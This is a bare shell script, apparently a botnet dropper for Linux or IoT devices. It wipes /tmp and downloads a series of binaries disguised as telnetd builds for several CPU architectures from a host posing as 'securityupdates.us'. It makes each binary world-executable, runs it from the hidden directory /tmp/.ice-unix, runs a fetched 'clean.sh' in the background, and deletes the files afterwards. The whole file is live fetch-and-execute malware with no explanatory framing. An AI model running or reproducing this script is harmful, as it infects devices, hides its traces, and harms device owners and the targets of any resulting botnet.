#!/bin/bash
cd /tmp
rm -f /tmp/.*
rm -f /tmp/*
wget http://securityupdates.us/clean.sh
chmod a+x clean.sh
cd /tmp
busybox wget http://securityupdates.us/clean.sh
chmod a+x clean.sh
(sh clean.sh) &
mkdir .ice-unix/
cd /tmp/.ice-unix
rm -rf ./*
wget http://securityupdates.us/telnetd_el 
chmod 777 telnetd_el 
./telnetd_el
/tmp/telnetd_el
rm -f /tmp/.ice-unix/*
wget http://securityupdates.us/telnetds 
chmod 777 telnetds 
./telnetds
rm -f /tmp/.ice-unix/*
wget http://securityupdates.us/telnetdm 
chmod 777 telnetdm 
./telnetdm
rm -f /tmp/.ice-unix/*
wget http://securityupdates.us/telnetdpc 
chmod 777 telnetdpc 
./telnetdpc
rm -f /tmp/.ice-unix/*
wget http://securityupdates.us/telnetdsh 
chmod 777 telnetdsh 
./telnetdsh
rm -f /tmp/.ice-unix/*
busybox wget http://securityupdates.us/telnetd_el -P /tmp/.ice-unix 
chmod 777 telnetd_el 
./telnetd_el
rm -f /tmp/.ice-unix/*
busybox wget http://securityupdates.us/telnetds -P /tmp/.ice-unix 
chmod 777 telnetds 
./telnetds
rm -f /tmp/.ice-unix/*
busybox wget http://securityupdates.us/telnetdm -P /tmp/.ice-unix 
chmod 777 telnetdm 
./telnetdm
rm -f /tmp/.ice-unix/*
busybox wget http://securityupdates.us/telnetdpc -P /tmp/.ice-unix 
chmod 777 telnetdpc 
./telnetdpc
rm -f /tmp/.ice-unix/*
busybox wget http://securityupdates.us/telnetdsh -P /tmp/.ice-unix 
chmod 777 telnetdsh 
./telnetdsh
rm -f /tmp/.ice-unix/*
